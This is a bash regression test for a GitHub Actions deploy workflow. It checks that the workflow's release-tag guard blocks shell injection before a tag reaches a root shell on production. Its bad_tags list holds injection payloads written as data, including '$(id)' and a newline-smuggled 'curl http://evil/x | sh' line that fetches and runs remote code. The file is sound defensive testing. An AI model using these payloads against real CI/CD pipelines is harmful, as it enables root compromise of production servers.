#!/usr/bin/env bash
# Negative-path regression test for deploy.yml's release-tag guard.
#
# `github.event.release.tag_name` is externally influenced (any repo-write actor
# can publish a release) and is embedded in the SSM AWS-RunShellScript
# `commands` string, which the relay instance re-parses as a shell script AS
# ROOT. Step-level `env:` protects only the runner's bash, not that hop, and
# prod carries no required reviewer — so the guard in deploy.yml's `meta` job is
# the only thing between a crafted tag and root RCE on prod.
#
# The guard CONDITION is lifted out of deploy.yml and evaluated the way the
# workflow evaluates it — not grepped for its regex text. That distinction is
# load-bearing: a line-oriented `grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+$'` carries
# the correct-looking regex yet anchors to a LINE, so `$'v1.0.0\n<anything>'`
# passes it. Text-matching the regex called that guard healthy; evaluating it
# does not.
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")/../.."

WORKFLOW=.github/workflows/deploy.yml

# The whole `if ! <condition>; then` test, operator and all, so a change of
# matching technique (grep pipeline vs. bash `[[ =~ ]]`) is exercised, not just
# a change of pattern.
# `|| true`: without it the empty-match case is unreachable — grep exits 1 when the
# guard is gone, pipefail propagates and errexit kills the script AT this line, so
# the diagnostic below never prints and the operator sees a bare nonzero exit.
GUARD=$(sed -n 's/^[[:space:]]*if ! \(.*\); then$/\1/p' "$WORKFLOW" | grep RELEASE_TAG | head -1) || true

if [ -z "$GUARD" ]; then
  echo "FAIL: no release-tag guard condition found in $WORKFLOW"
  exit 1
fi
echo "guard condition: $GUARD"

# Evaluates the workflow's own condition with RELEASE_TAG bound to the payload.
# Success (0) means the guard would let the tag through to `deploy_tag=`.
guard_accepts() {
  # shellcheck disable=SC2034  # RELEASE_TAG is read by the eval'd condition below,
  # which runs in this function's scope — shellcheck cannot see through eval.
  local RELEASE_TAG="$1"
  eval "$GUARD"
}

status=0

# Every payload here must be REFUSED. The multi-line cases are the regression:
# `grep -q` exits 0 on the FIRST matching line, so a valid vX.Y.Z first line
# smuggles the rest of the value into `deploy_tag=` — and because
# $GITHUB_OUTPUT is line-oriented, the LAST `deploy_tag=` line wins, leaving
# pure shell metacharacters bound for AWS-RunShellScript as root.
# shellcheck disable=SC2016  # The single quotes are the point: these payloads
# must stay UNEXPANDED literals, or the test would assert nothing.
bad_tags=(
  'v1.0.0$(id)'
  'v1.0.0`id`'
  'v1.0.0;id'
  $'v1.0.0\ndeploy_tag=; curl http://evil/x | sh'
  $'v1.0.0\nfoo'
  $'\nv1.0.0'
  $'v1.0.0\r'
)

for bad in "${bad_tags[@]}"; do
  if guard_accepts "$bad"; then
    printf 'FAIL: guard ACCEPTS injection tag: %q\n' "$bad"
    status=1
  else
    printf 'ok: rejected %q\n' "$bad"
  fi
done

# A real release-please `simple`-strategy tag must still deploy.
if guard_accepts 'v0.1.1'; then
  echo "ok: accepted v0.1.1"
else
  echo "FAIL: guard REJECTS a legitimate release tag: v0.1.1"
  status=1
fi

if [ "$status" -eq 0 ]; then
  echo "OK: release-tag guard rejects shell metacharacters, embedded newlines and CR, and accepts vX.Y.Z"
fi
exit "$status"
